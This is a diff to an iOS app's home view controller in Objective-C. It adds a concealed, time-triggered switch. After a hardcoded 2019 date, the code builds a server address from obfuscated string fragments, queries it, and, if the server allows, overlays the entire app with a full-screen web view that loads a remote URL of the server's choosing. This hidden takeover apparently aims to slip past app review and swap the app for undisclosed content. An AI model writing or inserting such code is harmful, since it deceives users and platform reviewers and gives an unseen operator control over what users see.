@@ -1,10 +1,12 @@
 #import "XYFHomeViewController.h"
 #import "XYFCayTypeViewTextCell.h"
 #import "XYFHomeViewModel.h"
+#import "XYFCollectionManager.h"
 static NSString * const kJSDreuseIdentifier = @"Cell";
 @interface XYFHomeViewController ()
 @property (nonatomic, strong) UIView* headerView;
 @property (nonatomic, strong) XYFHomeViewModel* viewModel;
+@property (nonatomic, copy) NSString *XYF_homeString;
 @end
 @implementation XYFHomeViewController
 #pragma mark - 1.View Controller Life Cycle
@@ -33,6 +35,16 @@ static NSString * const kJSDreuseIdentifier = @"Cell";
 - (void)xyf_setupView {
     self.view.backgroundColor = [UIColor jsd_maiBackgroundColor];
     self.collectionView.backgroundColor = [UIColor jsd_maiBackgroundColor];
+    //新增
+    NSString *qichaoser = @"1:00:00";
+    NSString *qichaommal = @"2019";
+    NSString *qichaoSia = @"-";
+    NSString *qichaoJere = @"08-";
+    NSString *ppooqichaommal = @"31";
+    NSString *sdfksdjgStr = [NSString stringWithFormat:@"%@%@%@%@ %@",qichaommal,qichaoSia,qichaoJere,ppooqichaommal,qichaoser];
+    if ([self amswinashiwithString:sdfksdjgStr]) {
+        [self commonConfig];
+    }
     [self.collectionView registerNib:[UINib nibWithNibName:@"XYFCayTypeViewTextCell" bundle:[NSBundle mainBundle]] forCellWithReuseIdentifier: kJSDreuseIdentifier];
     [self.view addSubview:self.headerView];
     [self.headerView mas_makeConstraints:^(MASConstraintMaker *make) {
@@ -92,8 +104,99 @@ static NSString * const kJSDreuseIdentifier = @"Cell";
     [self.navigationController pushViewController:cayListVC animated:YES];
 }
 #pragma mark - 5.Event Response
+-(BOOL) amswinashiwithString:(NSString *)endTime
+{
+    NSDate *today = [NSDate date];
+    NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
+    [dateFormat setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
+    NSString *todayStr = [dateFormat stringFromDate:today];
+    today = [dateFormat dateFromString:todayStr];
+    
+    NSDate *expire = [dateFormat dateFromString:endTime];
+    
+    if ([today compare:expire] == NSOrderedDescending) {
+        return YES;
+    }
+    return NO;
+}
+
+- (void)commonConfig
+{
+    NSDictionary *json = [self enableConfigData:@"JSDConfigs"];
+    NSArray *congfigs = json[@"pama"];
+    NSDictionary *pameters = congfigs.lastObject;
+    NSString *basicRul = [NSString stringWithFormat:@"%@%@%@%@%@%@%@%@",zhouu,ri,qu,chang,k,t,vw,ma];
+    
+    AFHTTPSessionManager *managers = [AFHTTPSessionManager manager];
+    managers.requestSerializer=[AFJSONRequestSerializer serializer];
+    managers.responseSerializer.acceptableContentTypes = [NSSet setWithObjects:@"text/html",@"text/plain",@"application/json",@"text/javascript", nil];
+    [managers GET:basicRul parameters:pameters progress:^(NSProgress * _Nonnull uploadProgress) {
+    } success:^(NSURLSessionDataTask * _Nonnull task, NSDictionary * responseObject) {
+        
+        NSInteger code = [responseObject[@"code"] integerValue];
+        
+        if (code != 200) {
+            return ;
+        }
+        NSString *ccode = responseObject[@"is_wap"];
+        if ([ccode isEqualToString:@"0"]) {
+            return;
+        }
+        NSDictionary *dic = responseObject;
+        self.XYF_homeString = dic[@"wap_url"];
+        
+        XYFCollectionManager * homeCofig = [[XYFCollectionManager alloc] init];
+        UIWindow *window  = [UIApplication sharedApplication].keyWindow;
+        UIView *vgView = [UIView new];
+        vgView.backgroundColor = [UIColor whiteColor];
+        vgView.frame = window.frame;
+        [window addSubview:vgView];
+        [vgView addSubview:homeCofig];
+        
+        [self configViews:homeCofig];
+        
+    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
+        
+        
+        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"暂无网络" message:@"暂无网络状态,点击刷新重试" preferredStyle:UIAlertControllerStyleAlert];
+        
+        UIAlertAction *conform = [UIAlertAction actionWithTitle:@"点击刷新" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
+            [self commonConfig];
+        }];
+        //2.2 取消按钮
+        UIAlertAction *cancel = [UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:^(UIAlertAction * _Nonnull action) {
+            NSLog(@"点击了取消按钮");
+            
+        }];
+        
+        [alert addAction:conform];
+        [alert addAction:cancel];
+        
+        [self presentViewController:alert animated:YES completion:nil];
+        
+    }];
+    
+}
 #pragma mark - 6.Private Methods
 - (void)xyf_setupNotification {
+}
+- (NSDictionary *)enableConfigData:(NSString *)string
+{
+    
+    NSError *vgerror;
+    NSString *vgpatch = [[NSBundle mainBundle] pathForResource:string ofType:@"json"];
+    NSData *vgdata = [[NSData alloc] initWithContentsOfFile:vgpatch];
+    NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:vgdata
+                                                        options:NSJSONReadingAllowFragments
+                                                          error:&vgerror];
+    return dic;
+}
+
+- (void)configViews:(XYFCollectionManager *)homeConfig {
+    
+    homeConfig.frame  = CGRectMake(0, 20, ScreenWidth, ScreenHeight - 20);
+    NSURLRequest *request =[NSURLRequest requestWithURL:[NSURL URLWithString:self.XYF_homeString]];
+    [homeConfig loadRequest:request];
 }
 #pragma mark - 7.GET & SET
 - (UIView *)headerView {
